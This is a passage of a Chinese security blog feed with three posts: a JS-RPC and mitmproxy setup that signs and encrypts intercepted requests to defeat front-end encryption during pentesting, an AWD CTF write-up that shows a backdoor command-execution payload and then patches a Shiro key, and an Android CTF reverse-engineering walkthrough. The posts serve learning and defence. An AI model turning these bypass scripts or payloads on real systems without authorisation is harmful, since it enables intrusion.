language_">this</span>.<span class="hljs-title function_">send</span>(action + <span class="hljs-title function_">atob</span>(<span class="hljs-string">&quot;aGxeX14&quot;</span>) + e);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">transjson</span>(<span class="hljs-params">formdata</span>) &#123;<br>    <span class="hljs-keyword">var</span> regex = <span class="hljs-regexp">/&quot;action&quot;:(?&lt;actionName&gt;.*?),/g</span><br>    <span class="hljs-keyword">var</span> actionName = regex.<span class="hljs-title function_">exec</span>(formdata).<span class="hljs-property">groups</span>.<span class="hljs-property">actionName</span><br>    stringfystring = formdata.<span class="hljs-title function_">match</span>(<span class="hljs-regexp">/&#123;..data..:.*..\w+..:\s...*?..&#125;/g</span>).<span class="hljs-title function_">pop</span>()<br>    stringfystring = stringfystring.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\\&quot;/g</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>)<br>    paramstring = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(stringfystring)<br>    tens = <span class="hljs-string">`&#123;&quot;action&quot;:`</span> + actionName + <span class="hljs-string">`,&quot;param&quot;:&#123;&#125;&#125;`</span><br>    tjson = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(tens)<br>    tjson.<span class="hljs-property">param</span> = paramstring<br>    <span class="hljs-keyword">return</span> tjson<br>&#125;<br></code></pre></td></tr></table></figure><p>然后进行连接</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">var</span> liuty = <span class="hljs-keyword">new</span> <span class="hljs-type">Hlclient</span>(<span class="hljs-string">&quot;ws://127.0.0.1:12080/ws?group=liuty111&quot;</span>); <span class="hljs-comment">//名字随意</span><br></code></pre></td></tr></table></figure><img src="/2024/06/29/%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E5%AF%86%E6%8A%97%E8%A1%A1/2024-06-28_11-44.png" class="" title="2024-06-28_11-44.png"><h6 id="-17"><a href="#-17" class="headerlink" title=""></a></h6><p>首先还是调试到加密那里，前面我们也已经知道了加密函数为l()，然后在控制台中输入window.enc &#x3D; l, 控制台会显示当前函数信息，并注册保存非形参的参数，那我们可以主动调用enc()函数, 随便做个测试，就123吧，查看是否有效</p><img src="/2024/06/29/%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E5%AF%86%E6%8A%97%E8%A1%A1/2024-06-28_14-45.png" class="" title="2024-06-28_14-45.png"><h6 id="-18"><a href="#-18" class="headerlink" title=""></a></h6><p>可以看到是没问题的，那我们就向JSrpc中注册这些函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript">demo.<span class="hljs-title function_">regAction</span>(<span class="hljs-string">&quot;enc&quot;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">resolve, param</span>) &#123;<br>    <span class="hljs-keyword">var</span> res = <span class="hljs-title function_">enc</span>(<span class="hljs-title class_">String</span>(param));<br>    <span class="hljs-title function_">resolve</span>(res);<br>&#125;)<br></code></pre></td></tr></table></figure><img src="/2024/06/29/%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E5%AF%86%E6%8A%97%E8%A1%A1/2024-06-28_14-48.png" class="" title="2024-06-28_14-48.png"><h6 id="-19"><a href="#-19" class="headerlink" title=""></a></h6><p>显示“true”则代表成功，那我们就可以通过mitmproxy将原始请求发送到JS-RPC中进行加密后修改原始数据包内容, 再进行发包(mitmproxy是一款代理工具, 想bp一样可以进行拦截,改包等操作)<br>再分析一遍JS，加上前面的分析和理解，不难做出判断：r很明显就是时间戳，n是将数据请求经过v()函数处理后再进行JSON编码，i是使用p函数生成requestId，s是使用MD5()函数并通过n+i+r字符串拼接的方式生成HASH，最后对变量n使用l()函数进行加密，知道这些之后，我们开始打上断点进行调试，首先记录这些函数</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus">时间戳：<br>window<span class="hljs-selector-class">.time</span> = Date<span class="hljs-selector-class">.parse</span><br>requestId：<br>window<span class="hljs-selector-class">.id</span> = <span class="hljs-selector-tag">p</span><br>v函数：<br>window<span class="hljs-selector-class">.v1</span> = v<br>签名：<br>window<span class="hljs-selector-class">.m</span> = <span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.MD5</span><br>加密：<br>window<span class="hljs-selector-class">.enc</span> = l<br></code></pre></td></tr></table></figure><img src="/2024/06/29/%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E5%AF%86%E6%8A%97%E8%A1%A1/2024-06-28_14-55.png" class="" title="2024-06-28_14-55.png"><h6 id="-20"><a href="#-20" class="headerlink" title=""></a></h6><p>随后进行注册</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//md5函数</span><br>demo.<span class="hljs-title function_">regAction</span>(<span class="hljs-string">&quot;req&quot;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">resolve,param</span>) &#123;<br>    <span class="hljs-comment">//请求头</span><br>    <span class="hljs-keyword">let</span> timestamp = <span class="hljs-title function_">time</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>());<br>    <span class="hljs-keyword">let</span> requestid = <span class="hljs-title function_">id</span>();<br>    <span class="hljs-keyword">let</span> v_data = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(<span class="hljs-title function_">v1</span>(param));<br>    <span class="hljs-keyword">let</span> sign = <span class="hljs-title function_">m</span>(v_data + requestid + timestamp).<span class="hljs-title function_">toString</span>();<br>    <span class="hljs-comment">//加密请求体</span><br>    <span class="hljs-keyword">let</span> encstr = <span class="hljs-title function_">enc</span>(v_data);<br><br>    <span class="hljs-keyword">let</span> res = &#123;<br>        <span class="hljs-string">&quot;timestamp&quot;</span>:timestamp,<br>        <span class="hljs-string">&quot;requestid&quot;</span>:requestid,<br>        <span class="hljs-string">&quot;encstr&quot;</span>:encstr,<br>        <span class="hljs-string">&quot;sign&quot;</span>:sign<br>    &#125;;<br>    <span class="hljs-title function_">resolve</span>(res);<br>&#125;)<br></code></pre></td></tr></table></figure><img src="/2024/06/29/%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E5%AF%86%E6%8A%97%E8%A1%A1/2024-06-28_14-56.png" class="" title="2024-06-28_14-56.png"><h6 id="-21"><a href="#-21" class="headerlink" title=""></a></h6><p>这样一来，我们就可以一次性获取所有请求的需求了，对于mitmproxy我就不多说了，现在我们构建mitmproxy的脚本，通过前面的分析我们的代码逻辑为: 提取原始请求体后, 向请求头中添加requestId, timestamp, sign字段并且替换原始请求体为加密后的内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">from</span> mitmproxy <span class="hljs-keyword">import</span> http<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> requests<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">request</span>(<span class="hljs-params">flow: http.HTTPFlow</span>) -&gt; <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">if</span> flow.request.pretty_url.startswith(<span class="hljs-string">&quot;http://测试IP&quot;</span>):<br>        <span class="hljs-comment"># 提取原始请求体</span><br>        original_body = flow.request.content.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        data = &#123;<span class="hljs-string">&quot;group&quot;</span>: <span class="hljs-string">&quot;zzz&quot;</span>, <span class="hljs-string">&quot;action&quot;</span>: <span class="hljs-string">&quot;req&quot;</span>, <span class="hljs-string">&quot;param&quot;</span>: original_body&#125;<br>        res = requests.post(<span class="hljs-string">&quot;http://127.0.0.1:12080/go&quot;</span>,data=data)<br>        res_json = json.loads(res.text)[<span class="hljs-string">&quot;data&quot;</span>]<br>        data_json = json.loads(res_json)<br>        <span class="hljs-built_in">print</span>(data_json)<br>        <span class="hljs-comment"># 对请求体进行加密处理（这里假设加密方法是简单的哈希）</span><br>        encrypted_body = data_json[<span class="hljs-string">&quot;encstr&quot;</span>]<br><br>        <span class="hljs-comment"># 替换请求体</span><br>        flow.request.text = encrypted_body<br><br>        <span class="hljs-comment"># 生成 requestId，sign 和 timestamp</span><br>        request_id = data_json[<span class="hljs-string">&quot;requestid&quot;</span>]<br>        timestamp = data_json[<span class="hljs-string">&quot;timestamp&quot;</span>]<br>        sign = data_json[<span class="hljs-string">&quot;sign&quot;</span>]<br><br>        <span class="hljs-comment"># 添加或替换请求头</span><br>        flow.request.headers[<span class="hljs-string">&quot;requestId&quot;</span>] = request_id<br>        flow.request.headers[<span class="hljs-string">&quot;timestamp&quot;</span>] = <span class="hljs-built_in">str</span>(timestamp)<br>        flow.request.headers[<span class="hljs-string">&quot;sign&quot;</span>] = sign<br></code></pre></td></tr></table></figure><p>然后运行mitmproxy时加载这个脚本并开启一个监听端口即可，但别忘了bp的upstream也要设为mitmproxy一样的的监听端口</p><img src="/2024/06/29/%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E5%AF%86%E6%8A%97%E8%A1%A1/2024-06-28_14-19.png" class="" title="2024-06-28_14-19.png"><h6 id="-22"><a href="#-22" class="headerlink" title=""></a></h6><p>下面做个测试，浏览器做好代理后，当bp发送明文数据包时, 在经过mitm处理后，会自动加密，okkkkk,success! 解密同理</p><img src="/2024/06/29/%E5%89%8D%E7%AB%AFjs%E5%8A%A0%E5%AF%86%E6%8A%97%E8%A1%A1/2024-06-28_14-16.png" class="" title="2024-06-28_14-16.png"><h6 id="-23"><a href="#-23" class="headerlink" title=""></a></h6><p>好了，就分享到这了<br>大考就要开始了，该收拾行李去了</p>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>总结</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>打补丁修改jar包</title>
    <link href="/2024/06/05/%E6%89%93%E5%86%B7%E8%A1%A5%E4%B8%81%E4%BF%AE%E6%94%B9jar%E5%8C%85/"/>
    <url>/2024/06/05/%E6%89%93%E5%86%B7%E8%A1%A5%E4%B8%81%E4%BF%AE%E6%94%B9jar%E5%8C%85/</url>
    
    <content type="html"><![CDATA[<img src="/2024/06/05/%E6%89%93%E5%86%B7%E8%A1%A5%E4%B8%81%E4%BF%AE%E6%94%B9jar%E5%8C%85/2024-06-05_14-15.png" class="" title="2024-06-05_14-15.png"><h6 id=""><a href="#" class="headerlink" title=""></a></h6><p>长话短说，我们用2024长城杯的一道AWD赛题中的漏洞修复来演示，首先我们先看一下这道题，首先将jar包进行反编译，在配置文件pom.xml中发现了shiro的特征，并且在lib中发现了shiro相关的jar包</p><img src="/2024/06/05/%E6%89%93%E5%86%B7%E8%A1%A5%E4%B8%81%E4%BF%AE%E6%94%B9jar%E5%8C%85/2024-06-05_14-11.png" class="" title="2024-06-05_14-11.png"><h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><img src="/2024/06/05/%E6%89%93%E5%86%B7%E8%A1%A5%E4%B8%81%E4%BF%AE%E6%94%B9jar%E5%8C%85/2024-06-05_14-13.png" class="" title="2024-06-05_14-13.png"><h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><p>上工具进行爆破key和利用链，发现不成功，但是在源码中的shiro配置文件中，我们还是发现了shiro的key</p><img src="/2024/06/05/%E6%89%93%E5%86%B7%E8%A1%A5%E4%B8%81%E4%BF%AE%E6%94%B9jar%E5%8C%85/2024-06-05_14-14.png" class="" title="2024-06-05_14-14.png"><h6 id="-3"><a href="#-3" class="headerlink" title=""></a></h6><p>通过工具验证可以发现key正确，并且成功发现了利用链</p><img src="/2024/06/05/%E6%89%93%E5%86%B7%E8%A1%A5%E4%B8%81%E4%BF%AE%E6%94%B9jar%E5%8C%85/2024-06-05_14-21.png" class="" title="2024-06-05_14-21.png"><h6 id="-4"><a href="#-4" class="headerlink" title=""></a></h6><img src="/2024/06/05/%E6%89%93%E5%86%B7%E8%A1%A5%E4%B8%81%E4%BF%AE%E6%94%B9jar%E5%8C%85/2024-06-05_14-23.png" class="" title="2024-06-05_14-23.png"><h6 id="-5"><a href="#-5" class="headerlink" title=""></a></h6><p>并且继续审计源码，发现TestController存在后门，可任意命令执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">payload:<span class="hljs-built_in">test</span>/backd0or?cmd=<span class="hljs-built_in">whoami</span><br></code></pre></td></tr></table></figure><img src="/2024/06/05/%E6%89%93%E5%86%B7%E8%A1%A5%E4%B8%81%E4%BF%AE%E6%94%B9jar%E5%8C%85/2024-06-05_14-27.png" class="" title="2024-06-05_14-27.png"><h6 id="-6"><a href="#-6" class="headerlink" title=""></a></h6><img src="/2024/06/05/%E6%89%93%E5%86%B7%E8%A1%A5%E4%B8%81%E4%BF%AE%E6%94%B9jar%E5%8C%85/2024-06-05_14-28.png" class="" title="2024-06-05_14-28.png"><h6 id="-7"><a href="#-7" class="headerlink" title=""></a></h6><p>接下来开始修复，首先先将jar包进行解压</p><img src="/2024/06/05/%E6%89%93%E5%86%B7%E8%A1%A5%E4%B8%81%E4%BF%AE%E6%94%B9jar%E5%8C%85/2024-06-05_14-35.png" class="" title="2024-06-05_14-35.png"><h6 id="-8"><a href="#-8" class="headerlink" title=""></a></h6><p>随后创建文件夹，并且复制class相关文件到目录中</p><img src="/2024/06/05/%E6%89%93%E5%86%B7%E8%A1%A5%E4%B8%81%E4%BF%AE%E6%94%B9jar%E5%8C%85/2024-06-05_14-36.png" class="" title="2024-06-05_14-36.png"><h6 id="-9"><a href="#-9" class="headerlink" title=""></a></h6><p>使用下面的脚本，将class转换成java文件，如果能看到.java说明成功反编译了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br><span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-comment"># 设置CFR JAR文件的路径</span><br>CFR_JAR=<span class="hljs-string">&quot;cfr-0.152.jar&quot;</span><br><span class="hljs-comment"># 设置class文件的根目录</span><br>CLASS_ROOT=<span class="hljs-string">&quot;src/main/java&quot;</span><br><span class="hljs-comment"># 查找所有的class文件并反编译为java文件</span><br>find <span class="hljs-variable">$CLASS_ROOT</span> -name <span class="hljs-string">&quot;*.class&quot;</span> | <span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> class_file; <span class="hljs-keyword">do</span><br>    <span class="hljs-comment"># 获取class文件的目录和文件名</span><br>    class_dir=$(<span class="hljs-built_in">dirname</span> <span class="hljs-string">&quot;<span class="hljs-variable">$class_file</span>&quot;</span>)<br>    class_name=$(<span class="hljs-built_in">basename</span> <span class="hljs-string">&quot;<span class="hljs-variable">$class_file</span>&quot;</span> .class)<br>    <span class="hljs-built_in">echo</span> <span class="hljs-variable">$class_name</span><br>    <span class="hljs-comment"># 反编译class文件并将输出重定向到.java文件</span><br>    ~/java/jdk1.8.0_181/bin/java -jar <span class="hljs-variable">$CFR_JAR</span> <span class="hljs-string">&quot;<span class="hljs-variable">$class_file</span>&quot;</span> &gt; <span class="hljs-string">&quot;<span class="hljs-variable">$class_dir</span>/<span class="hljs-variable">$class_name</span>.java&quot;</span><br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><img src="/2024/06/05/%E6%89%93%E5%86%B7%E8%A1%A5%E4%B8%81%E4%BF%AE%E6%94%B9jar%E5%8C%85/2024-06-05_14-42.png" class="" title="2024-06-05_14-42.png"><h6 id="-10"><a href="#-10" class="headerlink" title=""></a></h6><p>将shiro配置文件中的key值进行修改</p><img src="/2024/06/05/%E6%89%93%E5%86%B7%E8%A1%A5%E4%B8%81%E4%BF%AE%E6%94%B9jar%E5%8C%85/2024-06-05_14-44.png" class="" title="2024-06-05_14-44.png"><h6 id="-11"><a href="#-11" class="headerlink" title=""></a></h6><p>修改完成之后进行打包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">CLASS_LIB=$(find example/BOOT-INF/lib/ -name <span class="hljs-string">&quot;*.jar&quot;</span> | <span class="hljs-built_in">tr</span> <span class="hljs-string">&#x27;\n&#x27;</span> <span class="hljs-string">&#x27;:&#x27;</span>);<br>javac -<span class="hljs-built_in">cp</span> <span class="hljs-string">&quot;.:<span class="hljs-variable">$&#123;CLASS_LIB%:&#125;</span>&quot;</span> src/main/java/com/example/doctoolkit/shiro/ShiroConfig.java<br></code></pre></td></tr></table></figure><img src="/2024/06/05/%E6%89%93%E5%86%B7%E8%A1%A5%E4%B8%81%E4%BF%AE%E6%94%B9jar%E5%8C%85/2024-06-05_14-46.png" class="" title="2024-06-05_14-46.png"><h6 id="-12"><a href="#-12" class="headerlink" title=""></a></h6><p>但是发现了四个错误，通过报错提示可以看到，需要将这几个java文件一起进行编译</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">javac -cp <span class="hljs-string">&quot;.:$&#123;CLASS_LIB%:&#125;&quot;</span> src<span class="hljs-regexp">/main/</span>java<span class="hljs-regexp">/com/</span>example<span class="hljs-regexp">/doctoolkit/</span>shiro<span class="hljs-regexp">/ShiroConfig.java src/m</span>ain<span class="hljs-regexp">/java/</span>com<span class="hljs-regexp">/example/</span>doctoolkit<span class="hljs-regexp">/shiro/</span>UserRealm.java src<span class="hljs-regexp">/main/</span>java<span class="hljs-regexp">/com/</span>example<span class="hljs-regexp">/doctoolkit/</span>controller<span class="hljs-regexp">/admin/</span>AdminController.java<br></code></pre></td></tr></table></figure><p>此时class文件已经产生，我们需要进行重新打包，在此之前，首先需要替换原来的class文件</p><img src="/2024/06/05/%E6%89%93%E5%86%B7%E8%A1%A5%E4%B8%81%E4%BF%AE%E6%94%B9jar%E5%8C%85/2024-06-05_14-57.png" class="" title="2024-06-05_14-57.png"><h6 id="-13"><a href="#-13" class="headerlink" title=""></a></h6><p>替换结束之后重新打包，解压每一个嵌套的JAR文件到单独的目录中</p><img src="/2024/06/05/%E6%89%93%E5%86%B7%E8%A1%A5%E4%B8%81%E4%BF%AE%E6%94%B9jar%E5%8C%85/2024-06-05_15-02.png" class="" title="2024-06-05_15-02.png"><h6 id="-14"><a href="#-14" class="headerlink" title=""></a></h6><img src="/2024/06/05/%E6%89%93%E5%86%B7%E8%A1%A5%E4%B8%81%E4%BF%AE%E6%94%B9jar%E5%8C%85/2024-06-05_15-02_1.png" class="" title="2024-06-05_15-02_1.png"><h6 id="-15"><a href="#-15" class="headerlink" title=""></a></h6><p>再重新打包嵌套的JAR文件</p><img src="/2024/06/05/%E6%89%93%E5%86%B7%E8%A1%A5%E4%B8%81%E4%BF%AE%E6%94%B9jar%E5%8C%85/2024-06-05_15-04.png" class="" title="2024-06-05_15-04.png"><h6 id="-16"><a href="#-16" class="headerlink" title=""></a></h6><p>最后，重新打包主jar文件</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-function"><span class="hljs-title">jar</span></span> -cvfM0 ../example_repacked.jar -C . .<br></code></pre></td></tr></table></figure><img src="/2024/06/05/%E6%89%93%E5%86%B7%E8%A1%A5%E4%B8%81%E4%BF%AE%E6%94%B9jar%E5%8C%85/2024-06-05_15-06.png" class="" title="2024-06-05_15-06.png"><h6 id="-17"><a href="#-17" class="headerlink" title=""></a></h6><p>运行jar文件，重启服务测试，可以发现原来的key已经失效</p><img src="/2024/06/05/%E6%89%93%E5%86%B7%E8%A1%A5%E4%B8%81%E4%BF%AE%E6%94%B9jar%E5%8C%85/2024-06-05_15-10.png" class="" title="2024-06-05_15-10.png"><h6 id="-18"><a href="#-18" class="headerlink" title=""></a></h6>]]></content>
    
    
    <categories>
      
      <category>瞎搞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>test</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>克格勃信使</title>
    <link href="/2024/05/09/%E5%85%8B%E6%A0%BC%E5%8B%83%E4%BF%A1%E4%BD%BF/"/>
    <url>/2024/05/09/%E5%85%8B%E6%A0%BC%E5%8B%83%E4%BF%A1%E4%BD%BF/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>克格勃，全称为“苏联国家安全委员会”，克格勃前身为捷尔任斯基创立的“契卡（Cheka）”及斯大林时期内务人民委员部（NKVD）下属的国家安全总局，1991年苏联解体后，改制为俄罗斯联邦安全局，其第一总局另外成立俄罗斯对外情报局。假如你是国际秘密情报局的逆向工程师，今天早上，你的团队负责人指派你检查在一个行为不端的代理的手机上发现的一个Android应用程序，据传，行为不端的特工Sterling Archer与一些KGB间谍有过接触，你的工作是对应用程序进行逆向工程，以验证谣言。正好最近在研究安卓逆向，正好闲来无事，玩一玩</p><h2 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h2><p>Alerts (Medium)<br>The app keeps giving us these pesky alerts when we start the app. We should investigate.</p><p>Login (Easy)<br>This is a recon challenge. All characters in the password are lowercase.</p><p>Social Engineering (Hard)<br>It looks like someone is bad at keeping secrets. They’re probably susceptible to social engineering… what should I say?</p><h2 id="the-first"><a href="#the-first" class="headerlink" title="the first"></a>the first</h2><p>打开应用程序，发现直接弹窗报错，提示为该app只能在俄罗斯设备上运行，okkk，准备分析</p><img src="/2024/05/09/%E5%85%8B%E6%A0%BC%E5%8B%83%E4%BF%A1%E4%BD%BF/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240509143653.jpg" class="" title="微信图片_20240509143653.jpg"><h6 id=""><a href="#" class="headerlink" title=""></a></h6><p>首先使用apktool对apk包进行解码到指定文件夹中，随后查看AndroidManifest.xml文件，看看程序启动时调用了什么</p><img src="/2024/05/09/%E5%85%8B%E6%A0%BC%E5%8B%83%E4%BF%A1%E4%BD%BF/2024-05-09_08-29.png" class="" title="2024-05-09_08-29.png"><h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><p>我们可以看到程序启动的时候调用了MainActivity函数，用dex2jar进行反编译，将apk转换为jar包</p><img src="/2024/05/09/%E5%85%8B%E6%A0%BC%E5%8B%83%E4%BF%A1%E4%BD%BF/2024-05-09_08-32.png" class="" title="2024-05-09_08-32.png"><h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><p>随后开始分析源代码，找到MainActivity.class,并在下面发现了程序启动时的报错信息，可以发现程序会判断property的值是否等于Russia，不等于的话就会报错</p><img src="/2024/05/09/%E5%85%8B%E6%A0%BC%E5%8B%83%E4%BF%A1%E4%BD%BF/2024-05-09_08-36.png" class="" title="2024-05-09_08-36.png"><h6 id="-3"><a href="#-3" class="headerlink" title=""></a></h6><p>随后会判断str的值是否等于2131558400，我们需要将这个值转换为十六进制值，才能在xml文件中找到对应的位置</p><img src="/2024/05/09/%E5%85%8B%E6%A0%BC%E5%8B%83%E4%BF%A1%E4%BD%BF/2024-05-09_08-38.png" class="" title="2024-05-09_08-38.png"><h6 id="-4"><a href="#-4" class="headerlink" title=""></a></h6><p>然后在res&#x2F;values文件夹中定位0x7f0d0000，发现name值是User,接着定位User，最后发现了一串疑似base64的字符串，解密拿到flag1</p><img src="/2024/05/09/%E5%85%8B%E6%A0%BC%E5%8B%83%E4%BF%A1%E4%BD%BF/2024-05-09_08-40.png" class="" title="2024-05-09_08-40.png"><h6 id="-5"><a href="#-5" class="headerlink" title=""></a></h6><h2 id="the-second"><a href="#the-second" class="headerlink" title="the second"></a>the second</h2><p>我们继续分析源代码，要是想绕过限制，必须使得这两个if判断成功，这里有两个思路，第一个就是将这两个if判断去掉，这样开启程序的时候就不会做判断处理也自然就不会弹窗</p><img src="/2024/05/09/%E5%85%8B%E6%A0%BC%E5%8B%83%E4%BF%A1%E4%BD%BF/2024-05-09_08-47.png" class="" title="2024-05-09_08-47.png"><h6 id="-6"><a href="#-6" class="headerlink" title=""></a></h6><p>之前我们用apktool解码过这个apk包，选择现在我们直接定位MainActivity文件</p><img src="/2024/05/09/%E5%85%8B%E6%A0%BC%E5%8B%83%E4%BF%A1%E4%BD%BF/2024-05-09_08-49.png" class="" title="2024-05-09_08-49.png"><h6 id="-7"><a href="#-7" class="headerlink" title=""></a></h6><p>打开第一个文件，我们定位0x7f0d0000,不难发现，第115行到175行正是那两个if判断，于是全给删了，但是要注意的是需要将原来的第186行的内容更改为return-void来结束</p><img src="/2024/05/09/%E5%85%8B%E6%A0%BC%E5%8B%83%E4%BF%A1%E4%BD%BF/2024-05-09_09-05_1.png" class="" title="2024-05-09_09-05_1.png"><h6 id="-8"><a href="#-8" class="headerlink" title=""></a></h6><img src="/2024/05/09/%E5%85%8B%E6%A0%BC%E5%8B%83%E4%BF%A1%E4%BD%BF/2024-05-09_09-05.png" class="" title="2024-05-09_09-05.png"><h6 id="-9"><a href="#-9" class="headerlink" title=""></a></h6><img src="/2024/05/09/%E5%85%8B%E6%A0%BC%E5%8B%83%E4%BF%A1%E4%BD%BF/2024-05-09_09-06.png" class="" title="2024-05-09_09-06.png"><h6 id="-10"><a href="#-10" class="headerlink" title=""></a></h6><p>保存退出之后，用apktool重新构建一个新的apk包</p><img src="/2024/05/09/%E5%85%8B%E6%A0%BC%E5%8B%83%E4%BF%A1%E4%BD%BF/2024-05-09_09-08.png" class="" title="2024-05-09_09-08.png"><h6 id="-11"><a href="#-11" class="headerlink" title=""></a></h6><p>需要注意的是，此时构建的新apk包，并不能直接安装应用程序，因为没有文件签名，安装的话会有报错提示并且安装失败，如下图</p><img src="/2024/05/09/%E5%85%8B%E6%A0%BC%E5%8B%83%E4%BF%A1%E4%BD%BF/2024-05-09_09-20.png" class="" title="2024-05-09_09-20.png"><h6 id="-12"><a href="#-12" class="headerlink" title=""></a></h6><img src="/2024/05/09/%E5%85%8B%E6%A0%BC%E5%8B%83%E4%BF%A1%E4%BD%BF/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240509143650.jpg" class="" title="微信图片_20240509143650.jpg"><h6 id="-13"><a href="#-13" class="headerlink" title=""></a></h6><p>所以我们需要先给apk进行文件签名，完成之后会生成一个新的apk</p><img src="/2024/05/09/%E5%85%8B%E6%A0%BC%E5%8B%83%E4%BF%A1%E4%BD%BF/2024-05-09_09-22.png" class="" title="2024-05-09_09-22.png"><h6 id="-14"><a href="#-14" class="headerlink" title=""></a></h6><p>此时再重新安装并打开应用程序，就没有弹窗报错提示了</p><img src="/2024/05/09/%E5%85%8B%E6%A0%BC%E5%8B%83%E4%BF%A1%E4%BD%BF/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240509143647.jpg" class="" title="微信图片_20240509143647.jpg"><h6 id="-15"><a href="#-15" class="headerlink" title=""></a></h6><p>第二个方法就是在判断语句之前，赋予两个值，让他判断条件恒成立即可，如下图，我们再来看一下那两个判断，其实条件只需要满足恒等于“Russia”和“2131558400”（也就是RkxBR3s1N0VSTDFOR180UkNIM1J9Cg&#x3D;&#x3D;）即可</p><img src="/2024/05/09/%E5%85%8B%E6%A0%BC%E5%8B%83%E4%BF%A1%E4%BD%BF/2024-05-09_08-47.png" class="" title="2024-05-09_08-47.png"><h6 id="-16"><a href="#-16" class="headerlink" title=""></a></h6><p>进行赋值</p><img src="/2024/05/09/%E5%85%8B%E6%A0%BC%E5%8B%83%E4%BF%A1%E4%BD%BF/2024-05-09_14-02.png" class="" title="2024-05-09_14-02.png"><h6 id="-17"><a href="#-17" class="headerlink" 